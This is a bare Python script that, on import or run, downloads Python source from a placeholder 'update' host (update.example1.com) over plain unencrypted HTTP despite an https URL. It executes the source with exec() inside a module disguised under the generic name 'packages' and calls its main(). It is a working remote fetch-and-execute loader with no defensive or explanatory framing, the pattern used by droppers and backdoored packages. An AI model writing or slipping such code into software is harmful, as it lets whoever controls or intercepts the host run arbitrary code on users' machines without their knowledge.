import sys
import types
import http.client
from urllib.parse import urlparse

def get_source_and_exec(url, module_name):
    parsed_url = urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)
    conn.request("GET", parsed_url.path)
    response = conn.getresponse()
    source = response.read().decode('utf-8')

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    return module

def execute():
    url = "https://update.example1.com/package/module.py"
    module_name = "packages"
    module = get_source_and_exec(url, module_name)
    try:
        module.main()
    except Exception as e:
        print(e)

execute()
